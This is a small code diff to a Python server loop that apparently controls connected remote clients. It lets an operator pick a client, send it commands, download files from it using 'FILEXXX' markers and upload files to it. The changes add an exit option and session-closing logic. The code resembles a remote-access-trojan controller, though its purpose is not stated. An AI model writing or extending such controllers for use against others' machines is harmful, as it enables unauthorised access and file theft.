@@ -47,8 +47,11 @@ while True:
     clients.append(str(a))
     refresh()
   except KeyboardInterrupt:
-    pr('\r')
+    pr('\r\r')
     activate = int(input('Enter option: '))
+
+    if activate == -1:
+      sys.exit()
     
     Send(socks[activate], 'activate')
     pr('Activating client ' + str(activate))
@@ -66,7 +69,7 @@ while True:
       close(sock, client)
       break
 
-    # ⬇️
+    # ⬇️ dl file
     if data.endswith(b'FILEXXX'):
       data = data[:-7].split(b'FILENAMEXXX')
       d = b''.join(data[:-1])
@@ -87,7 +90,8 @@ while True:
       nc = input().strip()
 
     if nc == '-1':
-      sys.exit()
+      close(sock, client)
+      break
 
     if nc.startswith('ul '):
       fn = nc.split(' ')[1]
